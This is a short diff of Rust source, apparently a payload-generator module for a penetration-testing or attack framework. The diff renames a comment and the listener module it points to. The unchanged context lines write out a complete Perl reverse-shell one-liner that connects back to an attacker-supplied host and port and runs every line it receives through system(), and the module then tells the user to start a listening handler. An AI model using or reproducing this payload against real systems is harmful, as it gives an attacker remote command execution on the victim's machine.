@@ -83,7 +83,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
         None => { eprintln!("[-] LPORT required"); return 1; }
     };
 
-    // Metasploit-style perl reverse shell
+    // Perl reverse shell
     let payload = format!(
         r#"perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){{if($ENV{{$key}}=~/(.*)/){{$ENV{{$key}}=$1;}}}}$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){{if($_=~ /(.*)/){{system $1;}}}};'"#,
         lhost, lport
@@ -104,7 +104,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     println!("\n=== Option 2: Socket module (simpler) ===");
     println!("{}", payload_short);
 
-    println!("\n[*] Ensure handler is listening: use exploit/multi/handler");
+    println!("\n[*] Ensure handler is listening: use utilities/multi_handler");
 
     0
 }
